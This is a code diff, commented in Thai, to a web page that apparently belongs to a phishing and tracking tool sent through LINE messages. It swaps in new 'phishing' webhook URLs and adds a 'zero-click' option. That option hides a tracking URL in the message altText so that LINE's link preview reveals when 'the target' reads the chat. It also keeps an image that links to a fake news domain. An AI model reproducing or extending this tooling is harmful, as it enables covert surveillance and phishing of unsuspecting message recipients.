@@ -719,6 +719,19 @@
                 <div class="tips">
                     <p><strong>คำแนะนำ:</strong> เลือกรูปภาพที่น่าสนใจและมีขนาดไม่ใหญ่เกินไป เพื่อให้โหลดได้อย่างรวดเร็ว</p>
                 </div>
+                
+                <!-- เพิ่มตัวเลือกสำหรับ Preview Link -->
+                <div class="options-container" style="margin-top: 20px; padding: 12px; background-color: #f8f9fa; border-radius: 8px; border: 1px solid #e9ecef;">
+                    <label class="toggle-switch" style="display: flex; align-items: center; cursor: pointer;">
+                        <input type="checkbox" id="previewLinkToggle" style="margin-right: 10px;">
+                        <span style="font-size: 14px; color: var(--primary-dark); font-weight: 500;">
+                            เปิดใช้งาน Preview Link (ตรวจจับเมื่อเป้าหมายอ่านแชท)
+                        </span>
+                    </label>
+                    <p style="margin-top: 8px; margin-bottom: 0; font-size: 12px; color: var(--text-light);">
+                        <i class="fas fa-info-circle"></i> เมื่อเปิดใช้งาน ระบบจะสามารถตรวจจับได้เมื่อเป้าหมายเปิดอ่านแชทโดยที่ไม่ต้องคลิก
+                    </p>
+                </div>
             </div>
         </div>
         
@@ -746,8 +759,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby8dpSodHpr-nrP7tqlzW19Ieme7L7dUufg9mfIVx861ppkEVtZCv5SdB4htpAZY46v/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby8dpSodHpr-nrP7tqlzW19Ieme7L7dUufg9mfIVx861ppkEVtZCv5SdB4htpAZY46v/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -1485,25 +1498,54 @@
                 // 3. สร้าง URL สำหรับคลิก - เพิ่มพารามิเตอร์ source=image
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=image`;
                 
-                // 4. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้
-                const message = {
-                    type: 'flex',
-                    altText: `รูปภาพใหม่`,
-                    contents: {
-                        type: 'bubble',
-                        hero: {
-                            type: 'image',
-                            url: imageUrl,
-                            size: 'full',
-                            aspectRatio: '1:1',
-                            aspectMode: 'cover',
-                            action: {
-                                type: 'uri',
-                                uri: clickTrackUrl
+                // ตรวจสอบการเปิดใช้งาน Preview Link
+                const usePreviewLink = document.getElementById('previewLinkToggle').checked;
+                let message;
+                
+                if (usePreviewLink) {
+                    // สร้าง URL สำหรับ Preview Link โดยเพิ่มพารามิเตอร์ source=zeroclick
+                    const previewUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=zeroclick`;
+                    
+                    // สร้าง Flex Message พร้อมรูปภาพที่คลิกได้และ Preview Link
+                    message = {
+                        type: 'flex',
+                        altText: `รูปภาพใหม่ ${previewUrl}`, // ใส่ previewUrl ใน altText เพื่อให้ LINE พยายามโหลด preview
+                        contents: {
+                            type: 'bubble',
+                            hero: {
+                                type: 'image',
+                                url: imageUrl,
+                                size: 'full',
+                                aspectRatio: '1:1',
+                                aspectMode: 'cover',
+                                action: {
+                                    type: 'uri',
+                                    uri: clickTrackUrl
+                                }
                             }
                         }
-                    }
-                };
+                    };
+                } else {
+                    // กรณีไม่ใช้ Preview Link ใช้ Flex Message แบบเดิม
+                    message = {
+                        type: 'flex',
+                        altText: `รูปภาพใหม่`,
+                        contents: {
+                            type: 'bubble',
+                            hero: {
+                                type: 'image',
+                                url: imageUrl,
+                                size: 'full',
+                                aspectRatio: '1:1',
+                                aspectMode: 'cover',
+                                action: {
+                                    type: 'uri',
+                                    uri: clickTrackUrl
+                                }
+                            }
+                        }
+                    };
+                }
 
                 console.log("กำลังแชร์ Flex Message:", JSON.stringify(message, null, 2));
 
